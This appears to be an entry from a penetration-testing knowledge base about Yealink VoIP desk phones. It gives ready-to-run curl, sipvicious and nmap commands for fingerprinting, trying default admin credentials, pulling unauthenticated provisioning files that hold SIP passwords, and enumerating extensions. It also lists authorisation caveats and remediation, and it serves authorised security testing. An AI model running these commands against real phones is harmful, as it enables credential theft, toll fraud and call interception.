---
id: yealink_voip
technology: "Yealink VoIP Desk Phone (SIP-T/W/CP series)"
domain: IoT
category: iot
transport: ip
safety_class: intrusive
severity: high
life_safety: false
match:
  ports: [80, 443, 5060, 8000]
  banners: ["Yealink", "VoIP Phone", "SIP-T", "gSOAP", "Yealink IP Phone"]
  markers: ["Yealink", "servlet", "/servlet?", "config.bin", "autop", "y000000000000.cfg", "WEB=$", "phonecopy.google.com"]
quick_wins:
  - { cmd: "curl -sk -D - https://{host}/servlet?p=login&q=loginForm 2>/dev/null | grep -i 'yealink\\|server\\|set-cookie\\|www-authenticate' ; curl -sk -D - http://{host}/ 2>/dev/null | grep -i 'yealink\\|voip\\|server\\|realm'", safety: safe, note: "Fingerprint the Yealink web admin on :443/:80 — the login servlet, Server header, and Basic-auth realm confirm model/firmware without authenticating." }
  - { cmd: "curl -sk 'https://{host}/servlet?m=mod_data&p=status&q=load' 2>/dev/null | head -40 ; curl -sk 'http://{host}/servlet?m=mod_listener&p=login&q=loginForm' 2>/dev/null | head -20", safety: safe, note: "Read-only status/model disclosure via the mod_data servlet — leaks MAC, firmware, and hardware version, letting you map the exact CVE set before any login attempt." }
  - { cmd: "for p in 'admin:admin' 'admin:' 'admin:0000' 'admin:123456'; do u=${p%%:*}; w=${p#*:}; echo \"== $p ==\"; curl -sk -u \"$u:$w\" -D - 'https://{host}/servlet?m=mod_data&p=status&q=load' 2>/dev/null | grep -i 'HTTP/\\|status\\|firmware'; done", safety: intrusive, note: "Default-credential check (factory default is admin/admin; some builds ship blank/0000). Authenticated success returns device status JSON. Confirm scope authorisation — this is an active login attempt that logs on the device." }
  - { cmd: "for f in config.bin y000000000000.cfg $(printf '%012x' 0).cfg mac.cfg autop.cfg; do echo \"== /$f ==\"; curl -sk -o /dev/null -w '%{http_code} %{size_download}\\n' \"http://{host}/$f\"; curl -sk -o /dev/null -w '%{http_code}\\n' \"http://{host}/servlet?m=mod_account&p=account-register&q=load\"; done", safety: intrusive, note: "Provisioning/config-disclosure probe — unauthenticated retrieval of config.bin or the autoprovision .cfg exposes cleartext/base64 SIP AuthID + password and admin hash. Read-only but active; requires written authorisation." }
  - { cmd: "sipvicious_svmap {host}:5060 ; svwar -m INVITE -e100-200 {host} 2>/dev/null ; nmap -Pn -sU -p5060 --script sip-methods,sip-enum-users {host}", safety: intrusive, note: "SIP enumeration on 5060 — svmap fingerprints the SIP UA (Yealink), sip-methods reveals allowed verbs, and svwar/sip-enum-users enumerates valid extensions for later credential stuffing. Active traffic; authorise before running." }
references:
  - "CVE-2021-27561"
  - "CVE-2021-27562"
  - "CVE-2018-16217"
  - "CVE-2018-16218"
  - "CVE-2018-16219"
  - "CVE-2013-5758"
  - "DVR/VoIP config.bin SIP-credential disclosure (Yealink autoprovision advisory)"
mitre: "T1190"
---
# Yealink VoIP Desk Phone (SIP-T / W / CP series)

Yealink is one of the largest global vendors of SIP desk phones, DECT bases, and conference
units (SIP-T2x/T3x/T4x/T5x, W-series DECT, CP-series conference phones). Each phone runs an
embedded Linux web-management stack reachable over HTTP (:80) and HTTPS (:443), a servlet-based
admin UI (`/servlet?...`), and a SIP user-agent on UDP/TCP 5060. In enterprise deployments the
phones pull their configuration from a provisioning server via "autoprovision" (autop), fetching
per-MAC files such as `y000000000000.cfg`, `<mac>.cfg`, or a binary `config.bin`. Those files, and
the phone's own web UI, contain the full SIP account: registrar, SIP AuthID/username, and the SIP
password — often in cleartext or trivially reversible base64 — plus the admin password hash and
saved call records.

**Why it matters.** The highest-probability foothold is the web admin: factory firmware ships
with `admin/admin` (some builds use a blank or `0000` password), and administrators frequently
leave it unchanged on phones that are internet- or VLAN-reachable. A single successful login
dumps SIP credentials and call history, which lets an attacker register a rogue endpoint, place
toll-fraud/premium-rate calls, intercept or spoof calls, and pivot into the voice VLAN. Yealink's
history includes command-injection and disclosure bugs (CVE-2021-27561/27562 unauthenticated
RCE/command injection in the device management interface, CVE-2018-16217/16218/16219 default-
credential and injection issues, CVE-2013-5758 config exposure). Many models also expose the raw
`config.bin`/autoprovision `.cfg` without authentication, giving the same SIP secrets with no login
at all.

## Exploitation

1. **Fingerprint safely.** Grab `https://{host}/servlet?p=login&q=loginForm` and the `/` root over
   HTTP; the `Server` header, Basic-auth realm, and the `mod_data status/load` servlet reveal model,
   MAC, and firmware. Map the firmware to the CVE list above before touching credentials.
2. **Default-cred web admin (primary foothold).** Try `admin/admin`, then blank / `0000` / `123456`,
   against `https://{host}/servlet?m=mod_data&p=status&q=load`. A 200 with device-status JSON means
   you are authenticated. From the authenticated UI, export the configuration (Settings →
   Configuration → Export, or `GET /servlet?m=mod_data&p=phone-conf&q=export`) to obtain the SIP
   account block (`account.N.auth_name`, `account.N.password`, `account.N.sip_server`) and call logs.
3. **Unauth config/provisioning disclosure (no login needed).** Request `config.bin`,
   `y000000000000.cfg`, `<mac>.cfg`, `mac.cfg`, or `autop.cfg` directly over HTTP. If any returns a
   non-zero body at 200, decode it: the SIP password is stored cleartext or base64 and the admin
   password as a recoverable hash. This bypasses the web login entirely.
4. **Confirm the SIP account on 5060.** Use `sipvicious` (`svmap`, `svwar`) or `nmap sip-methods`/
   `sip-enum-users` to verify the registrar, enumerate valid extensions, and validate the recovered
   credentials by attempting a REGISTER only under explicit authorisation.

**Remediation.** Change the default `admin` password on every phone; disable the HTTP web server
(force HTTPS) or restrict management to a dedicated voice/management VLAN with source-IP ACLs;
require authenticated, encrypted (HTTPS + AES-encrypted `.cfg`) autoprovisioning and never serve
`config.bin`/`.cfg` from an open web root; upgrade to current Yealink firmware to close the
CVE-2021-27561/27562 and 2018 injection/disclosure bugs; and rotate any SIP account credentials
that were exposed while a vulnerable or default-configured phone was reachable.
